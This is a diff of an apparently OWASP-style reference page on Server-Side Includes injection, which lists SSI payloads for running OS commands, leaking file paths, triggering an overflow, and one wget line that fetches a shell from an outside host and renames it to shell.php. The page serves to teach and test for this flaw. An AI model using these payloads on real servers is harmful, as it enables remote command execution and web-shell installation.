@@ -28,7 +28,7 @@ It is possible to check if the application is properly validating input
 fields data by inserting characters that are used in SSI directives,
 like:
 
-`< ! # = / . " - > and [a-zA-Z0-9] `
+`< ! # = / . " - > and [a-zA-Z0-9] `
 
 Another way to discover if the application is vulnerable is to verify
 the presence of pages with extension .stm, .shtm and .shtml. However,
@@ -59,25 +59,25 @@ be used to execute OS commands.
 
 List files of directory:
 
-`<!--#exec cmd="ls" -->`
+`<!--#exec cmd="ls" -->`
 
 Access directories:
 
-`<!--#exec cmd="cd /root/dir/">`
+`<!--#exec cmd="cd /root/dir/">`
 
 Execution script:
 
-`<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->`
+`<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->`
 
 **Windows:**
 
 List files of directory:
 
-`<!--#exec cmd="dir" -->`
+`<!--#exec cmd="dir" -->`
 
 Access directories:
 
-`<!--#exec cmd="cd C:\admin\dir">`
+`<!--#exec cmd="cd C:\admin\dir">`
 
 ### Example 2
 
@@ -86,25 +86,25 @@ information:
 
 To change the error message output:
 
-`<!--#config errmsg="File not found, informs users and password"-->`
+`<!--#config errmsg="File not found, informs users and password"-->`
 
 To show current document filename:
 
-`<!--#echo var="DOCUMENT_NAME" -->`
+`<!--#echo var="DOCUMENT_NAME" -->`
 
 To show virtual path and filename:
 
-`<!--#echo var="DOCUMENT_URI" -->`
+`<!--#echo var="DOCUMENT_URI" -->`
 
 Using the “config” command and “timefmt” parameter, it is possible to
 control the date and time output format:
 
-`<!--#config timefmt="A %B %d %Y %r"-->`
+`<!--#config timefmt="A %B %d %Y %r"-->`
 
 Using the “fsize” command, it is possible to print the size of selected
 file:
 
-`<!--#fsize file="ssi.shtml" -->`
+`<!--#fsize file="ssi.shtml" -->`
 
 ### Example 3
 
@@ -120,7 +120,7 @@ it’s possible to perform this attack:
 
 ssi_over.shtml
 
-`<!--#include file=”UUUUUUUU...UU”-->`
+`<!--#include file=”UUUUUUUU...UU”-->`
 
 PS: The number of “U” needs to be longer than 2049.
 
